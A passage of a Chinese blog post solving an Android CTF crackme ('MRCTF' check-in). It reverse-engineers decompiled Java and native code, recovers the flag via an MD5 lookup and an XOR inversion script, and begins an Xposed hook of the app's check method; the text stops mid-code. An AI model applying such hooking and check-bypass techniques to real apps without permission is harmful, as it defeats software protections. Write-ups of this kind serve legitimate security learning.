<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">    EditText editText = <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span>.$username;</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(editText, <span class="string">"username"</span>);</span><br><span class="line">    Object obj = editText.getText().toString();</span><br><span class="line">    EditText editText2 = <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span>.$password;</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(editText2, <span class="string">"password"</span>);</span><br><span class="line">    String obj2 = editText2.getText().toString();</span><br><span class="line">    String str = <span class="string">"Wrong pass!"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Intrinsics.areEqual(obj, (Object) <span class="string">"MRCTF"</span>)) &#123;</span><br><span class="line">        String str2 = <span class="string">"null cannot be cast to non-null type java.lang.String"</span>;</span><br><span class="line">        Objects.requireNonNull(obj2, str2);</span><br><span class="line">        String substring = obj2.substring(<span class="number">6</span>, <span class="number">13</span>);</span><br><span class="line">        String str3 = <span class="string">"(this as java.lang.Strin…ing(startIndex, endIndex)"</span>;</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(substring, str3);</span><br><span class="line">        <span class="keyword">if</span> (Intrinsics.areEqual(MainActivityKt.encode(substring), (Object) <span class="string">"f5e69f42b7a9a0f1c9edede743a1d27f"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Intrinsics.areEqual(obj2.subSequence(<span class="number">0</span>, <span class="number">6</span>), (Object) <span class="string">"MRCTF&#123;"</span>) &amp;&amp; Intrinsics.areEqual(obj2.subSequence(obj2.length() - <span class="number">1</span>, obj2.length()), (Object) <span class="string">"&#125;"</span>)) &#123;</span><br><span class="line">                MainActivity mainActivity = <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span>.<span class="keyword">this</span>$<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> length = obj2.length() - <span class="number">1</span>;</span><br><span class="line">                Objects.requireNonNull(obj2, str2);</span><br><span class="line">                str2 = obj2.substring(<span class="number">13</span>, length);</span><br><span class="line">                Intrinsics.checkNotNullExpressionValue(str2, str3);</span><br><span class="line">                <span class="keyword">if</span> (mainActivity.check2(str2) == <span class="number">1</span>) &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span>.<span class="keyword">this</span>$<span class="number">0</span>.getApplicationContext(), <span class="string">"Right pass!"</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span>.<span class="keyword">this</span>$<span class="number">0</span>.getApplicationContext(), str, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span>.<span class="keyword">this</span>$<span class="number">0</span>.getApplicationContext(), str, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(<span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span>.<span class="keyword">this</span>$<span class="number">0</span>.getApplicationContext(), str, <span class="number">0</span>).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后可以看到，他先是获取了输入框的内容，然后比较了一下username是不是等于MRCTF，说明username是MRCTF，然后继续分析可以看到他截取了6,13的密码的值，是一段很像md5的一个值，是通过encode进行加密的，然后跟进这个encode去看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">encode</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    Intrinsics.checkNotNullParameter(str, <span class="string">"plain"</span>);</span><br><span class="line">    MessageDigest instance = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(instance, <span class="string">"MessageDigest.getInstance(\"MD5\")"</span>);</span><br><span class="line">    Object bytes = str.getBytes(Charsets.UTF_8);</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(bytes, <span class="string">"(this as java.lang.String).getBytes(charset)"</span>);</span><br><span class="line">    bytes = instance.digest(bytes);</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(bytes, <span class="string">"instance.digest(plain.toByteArray())"</span>);</span><br><span class="line">    StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytes) &#123;</span><br><span class="line">        String toHexString = Integer.toHexString(b &amp; <span class="number">255</span>);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(toHexString, <span class="string">"Integer.toHexString(hex)"</span>);</span><br><span class="line">        <span class="keyword">if</span> (toHexString.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            toHexString = <span class="string">'0'</span> + toHexString;</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuffer.append(toHexString);</span><br><span class="line">    &#125;</span><br><span class="line">    str = stringBuffer.toString();</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(str, <span class="string">"buff.toString()"</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就很明显了，就是一个典型的MD5加密算法，需要去解密一下，这个值，cmd5付费，发现一个somd5不要钱就可以得到结果，那么这个值就解决了。<br>继续回到onclick里面，发现他又判断两边的内容是不是”MRCTF{“和”}”，两边的值也确定了，然后看到下面还有一个check2的判断方法，截取的是中间部分剩下的，那说明这是最后一个加密了。<br>跟进去这个check2，发现是这样子的一段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">check2</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    Intrinsics.checkNotNullParameter(str, <span class="string">"part2"</span>);</span><br><span class="line">    <span class="keyword">int</span>[] iArr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">110</span>, <span class="number">82</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">95</span>, <span class="number">6</span>, <span class="number">94</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">83</span>, <span class="number">4</span>, <span class="number">93</span>, <span class="number">85</span>, <span class="number">111</span>, <span class="number">65</span>, <span class="number">93</span>, <span class="number">111</span>, <span class="number">124</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">100</span>, <span class="number">118</span>&#125;;</span><br><span class="line">    rand rand = <span class="keyword">new</span> rand(srand1, srand2);</span><br><span class="line">    <span class="keyword">int</span> length = str.length();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i2 = i;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((str.charAt(i) ^ StringsKt___StringsKt.first(rand.next(rand.getMemory()))) != iArr[i2]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i2++;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打眼一看他自己写的类只有两个，一个<code>rand</code>，一个<code>StringsKt___StringsKt</code>，先看rand：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">rand</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span>[] memory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">rand</span><span class="params">(<span class="keyword">long</span> j, <span class="keyword">long</span> j2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.memory = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;j, j2&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span>[] getMemory() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.memory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">(<span class="keyword">long</span>[] jArr)</span> </span>&#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(jArr, <span class="string">"&lt;set-?&gt;"</span>);</span><br><span class="line">        <span class="keyword">this</span>.memory = jArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">next</span><span class="params">(<span class="keyword">long</span>[] jArr)</span> </span>&#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(jArr, <span class="string">"memory"</span>);</span><br><span class="line">        <span class="keyword">long</span> j = jArr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">long</span> j2 = jArr[<span class="number">1</span>];</span><br><span class="line">        jArr[<span class="number">0</span>] = j2;</span><br><span class="line">        j ^= j &lt;&lt; <span class="number">23</span>;</span><br><span class="line">        jArr[<span class="number">1</span>] = ((j &gt;&gt;&gt; <span class="number">17</span>) ^ (j ^ j2)) ^ (j2 &gt;&gt;&gt; <span class="number">26</span>);</span><br><span class="line">        String valueOf = String.valueOf(jArr[<span class="number">1</span>] + j2);</span><br><span class="line">        String str = <span class="string">"null cannot be cast to non-null type java.lang.String"</span>;</span><br><span class="line">        Objects.requireNonNull(valueOf, str);</span><br><span class="line">        Object substring = valueOf.substring(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        String str2 = <span class="string">"(this as java.lang.Strin…ing(startIndex, endIndex)"</span>;</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(substring, str2);</span><br><span class="line">        <span class="keyword">if</span> (Intrinsics.areEqual(substring, (Object) <span class="string">"-"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String valueOf2 = String.valueOf(jArr[<span class="number">1</span>] + j2);</span><br><span class="line">        Objects.requireNonNull(valueOf2, str);</span><br><span class="line">        valueOf2 = valueOf2.substring(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(valueOf2, str2);</span><br><span class="line">        <span class="keyword">return</span> valueOf2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码很简单，就是将传进来的两个long值进行一顿操作再就没了。这个也是可以直接复制的。<br>那么继续看<code>StringsKt___StringsKt.first</code>这个方法是啥：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">first</span><span class="params">(CharSequence charSequence)</span> </span>&#123;</span><br><span class="line">    Intrinsics.checkNotNullParameter(charSequence, <span class="string">"$this$first"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((charSequence.length() == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> charSequence.charAt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException(<span class="string">"Char sequence is empty."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也是很简单，到此为止我们就解决了所有的未知方法，但是这个check2方法还需要两个long的值，是在MainActivity中进行定义的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> srand1 = <span class="number">202120212021L</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> srand2 = <span class="number">114514114514L</span>;</span><br></pre></td></tr></table></figure>
<p>好了，这些东西都解决了，那么就是反推结果了，可以看到check2方法只有满足：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((str.charAt(i) ^ StringsKt___StringsKt.first(rand.next(rand.getMemory()))) != iArr[i2]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>这个的时候返回0，也就是错误，那么我们就让他不满足，看到是一个异或，那么直接反过来得到str的每个字符，最终我们就可以得到最终的结果，自己写个小脚本：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> srand1 = <span class="number">202120212021L</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> srand2 = <span class="number">114514114514L</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">first</span><span class="params">(CharSequence charSequence)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((charSequence.length() == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> charSequence.charAt(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span>[] iArr = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">110</span>, <span class="number">82</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">95</span>, <span class="number">6</span>, <span class="number">94</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">83</span>, <span class="number">4</span>, <span class="number">93</span>, <span class="number">85</span>, <span class="number">111</span>, <span class="number">65</span>, <span class="number">93</span>, <span class="number">111</span>, <span class="number">124</span>,</span><br><span class="line">			<span class="number">98</span>, <span class="number">115</span>, <span class="number">100</span>, <span class="number">118</span> &#125;;</span><br><span class="line">	rand rand = <span class="keyword">new</span> rand(srand1, srand2);</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i2 = i;</span><br><span class="line">	String out = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; iArr.length) &#123;</span><br><span class="line">		out += (<span class="keyword">char</span>)(first(rand.next(rand.getMemory()))^iArr[i2]);</span><br><span class="line">		System.out.println(out);</span><br><span class="line">		i2++;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打印出最终的中间部分，正当我觉得大功告成的时候，他和我说flag不对，我觉得判断是没有任何错误的，到此为止已经到十一点了，第二天还要体测，不能睡的太晚，我就没有继续去搞他。<br>到了第二天，我就回过头来再看了一下这段代码，发现了一个蹊跷，实际上在<code>oncreate</code>方法执行的时候他还执行了一个<code>jni.test()</code>，我没去注意，觉得签到题不应该牵扯到so吧，而且我还忽略了一个问题，就是在MainActivity里面还有一个内部类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Companion</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Companion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">getSrand1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> MainActivity.srand1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setSrand1</span><span class="params">(<span class="keyword">long</span> j)</span> </span>&#123;</span><br><span class="line">        MainActivity.srand1 = j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">getSrand2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> MainActivity.srand2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setSrand2</span><span class="params">(<span class="keyword">long</span> j)</span> </span>&#123;</span><br><span class="line">        MainActivity.srand2 = j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JvmStatic</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">SetSrand</span><span class="params">(<span class="keyword">long</span> j, <span class="keyword">long</span> j2)</span> </span>&#123;</span><br><span class="line">        MainActivity.Companion.setSrand1(j);</span><br><span class="line">        MainActivity.Companion.setSrand2(j2);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他操作的时候Srand这两个值，这是唯一的在java层操作这个值的一个类，就考虑到可能是这个类修改了这两个值，但是没有任何一个地方调用了这个方法，很有可能是在so中进行的操作，然后我就拖出了so文件，简单分析了一下，里面有一个加密算法，但是看的有点长：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">signed <span class="keyword">int</span> __cdecl <span class="title">com_example_mrcheckin_jni_test</span><span class="params">(_JNIEnv *a1, unsigned __int8 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  signed __int32 v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  signed <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v5; <span class="comment">// kr10_8</span></span><br><span class="line">  unsigned <span class="keyword">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// kr20_4</span></span><br><span class="line">  signed <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  signed <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+20h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+20h] [ebp-6Ch]</span></span><br><span class="line">  unsigned <span class="keyword">int</span> v12; <span class="comment">// [esp+24h] [ebp-68h]</span></span><br><span class="line">  unsigned <span class="keyword">int</span> v13; <span class="comment">// [esp+24h] [ebp-68h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [esp+28h] [ebp-64h]</span></span><br><span class="line">  unsigned __int64 v15; <span class="comment">// [esp+38h] [ebp-54h]</span></span><br><span class="line">  unsigned __int64 v16; <span class="comment">// [esp+40h] [ebp-4Ch]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [esp+48h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+50h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+54h] [ebp-38h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [esp+58h] [ebp-34h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [esp+60h] [ebp-2Ch]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [esp+68h] [ebp-24h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [esp+70h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+78h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">825372722</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !(strlen((<span class="keyword">const</span> <span class="keyword">char</span> *)a2) &amp; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = strlen((<span class="keyword">const</span> <span class="keyword">char</span> *)a2) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &lt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = _byteswap_ulong(*(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v18 + v10));</span><br><span class="line">      *((_DWORD *)&amp;v20 + <span class="number">2</span> * v12) = v2;</span><br><span class="line">      *((_DWORD *)&amp;v20 + <span class="number">2</span> * v12++ + <span class="number">1</span>) = v2 &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      v10 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v13 &lt; (signed __int64)(unsigned <span class="keyword">int</span>)v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="number">0L</span>L;</span><br><span class="line">      v16 = (signed <span class="keyword">int</span>)_byteswap_ulong(*(_DWORD *)&amp;a2[v11]);</span><br><span class="line">      v15 = (signed <span class="keyword">int</span>)_byteswap_ulong(*(_DWORD *)&amp;a2[v11 + (_DWORD)(&amp;dword_A6E4 - <span class="number">10680</span>)]);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v14 += <span class="number">2654435769L</span>L;</span><br><span class="line">        HIDWORD(v3) = ((v21 + __PAIR__(SHIDWORD(v15) &gt;&gt; <span class="number">5</span>, (unsigned <span class="keyword">int</span>)(v15 &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">32</span>) ^ ((v14 + v15) &gt;&gt; <span class="number">32</span>) ^ ((v20 + <span class="number">16</span> * v15) &gt;&gt; <span class="number">32</span>);</span><br><span class="line">        LODWORD(v3) = v16;</span><br><span class="line">        v4 = (__PAIR__(HIDWORD(v16), (v21 + (v15 &gt;&gt; <span class="number">5</span>)) ^ (v14 + v15) ^ (v20 + <span class="number">16</span> * v15)) + v3) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">        LODWORD(v3) = ((v21 + (v15 &gt;&gt; <span class="number">5</span>)) ^ (v14 + v15) ^ (v20 + <span class="number">16</span> * v15)) + v16;</span><br><span class="line">        v16 = __PAIR__(v4, (unsigned <span class="keyword">int</span>)v3);</span><br><span class="line">        HIDWORD(v3) = v4;</span><br><span class="line">        v5 = v22 + <span class="number">16</span> * v3;</span><br><span class="line">        v6 = (v14 + v3) ^ v5;</span><br><span class="line">        v7 = v23 + (__PAIR__((unsigned <span class="keyword">int</span>)v4, (unsigned <span class="keyword">int</span>)v3) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        HIDWORD(v3) = ((v23</span><br><span class="line">                      + __PAIR__(</span><br><span class="line">                          (unsigned <span class="keyword">int</span>)(v4 &gt;&gt; <span class="number">5</span>),</span><br><span class="line">                          (unsigned <span class="keyword">int</span>)(__PAIR__((unsigned <span class="keyword">int</span>)v4, (unsigned <span class="keyword">int</span>)v3) &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">32</span>) ^ ((v14 + __PAIR__((unsigned <span class="keyword">int</span>)v4, (unsigned <span class="keyword">int</span>)v3)) &gt;&gt; <span class="number">32</span>) ^ HIDWORD(v5);</span><br><span class="line">        LODWORD(v3) = v15;</span><br><span class="line">        v15 = __PAIR__(HIDWORD(v15), v7 ^ v6) + v3;</span><br><span class="line">      &#125;</span><br><span class="line">      a2[v11] = BYTE3(v16);</span><br><span class="line">      a2[v11 + <span class="number">1</span>] = BYTE2(v16);</span><br><span class="line">      a2[v11 + <span class="number">2</span>] = BYTE1(v16);</span><br><span class="line">      a2[v11 + <span class="number">3</span>] = v16;</span><br><span class="line">      a2[v11 + <span class="number">4</span>] = BYTE3(v15);</span><br><span class="line">      a2[v11 + <span class="number">5</span>] = BYTE2(v15);</span><br><span class="line">      a2[v11 + <span class="number">6</span>] = BYTE1(v15);</span><br><span class="line">      a2[v11 + <span class="number">7</span>] = v15;</span><br><span class="line">      ++v13;</span><br><span class="line">      v11 += <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">42720</span>;</span><br><span class="line">  <span class="keyword">if</span> ( _stack_chk_guard != v24 )</span><br><span class="line">    JUMPOUT(*(_DWORD *)JNI_OnLoad);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>，就想着直接用他的这个so文件导入到我的安卓项目中看看他是否能直接将我的srand进行修改，然后我就得到修改之后的srand，然后我在操作的时候发现执行<code>jni.test()</code>的时候会报错，然后我又跟进so查看，发现它在jni_onload的时候执行了一个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL4 __<span class="function">cdecl <span class="title">sub_6340</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_7380(a1, <span class="string">"com/example/mrcheckin/jni"</span>, (<span class="keyword">int</span>)&amp;off_B920, <span class="number">1</span>) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>应该是一个根据程序操作的一个方法，然后我就按照程序的名字修改了我的项目进行测试，但是还是会报错，具体什么错误也没仔细去看了，反正解决了一大顿也没解决好，到这里思路终止了，我不能动态调试，属实是太着急人了，所以我就不得不全装一个新版本的安卓模拟器去执行这个程序然后找到被修改之后的srand，我先下载的夜神，安装上一个hook框架之后直接就崩了，我又下载了一个新版本的雷电模拟器，我之前的hook框架在雷电可以运行，所以我就用的雷电模拟器。<br>一切正常，那个安卓程序也可以安装成功了。<br>这个时候本想动态调试的，但是想了想还是直接hook吧，这样子会简单一些，现在我们hook的方法有许多：</p>
<ol>
<li>hook rand类的构造函数，获取传递进来的srand值</li>
<li>hook check2方法，在执行的时候获取到srand值</li>
</ol>
<p>我选择了后者，其实主要是想偷懒。<br>那么我就写了一个hook代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">		XposedBridge.log(lpparam.packageName);</span><br><span class="line">		XposedBridge.log(lpparam.packageName);</span><br><span class="line">		<span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">"com.example.mrcheckin"</span>))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"into"</span>);</span><br><span class="line">		findAndHookMethod(<span class="string">"com.example.mrcheckin.MainActivity"</span>, lpparam.classLoader, <span class="string">"check2"</span>, String<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">				<span class="title">new</span> <span class="title">XC_MethodHook</span>() </span>&#123;</span><br><span class="line">					<span class="meta">@Override</span></span><br><span class="line">					<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span 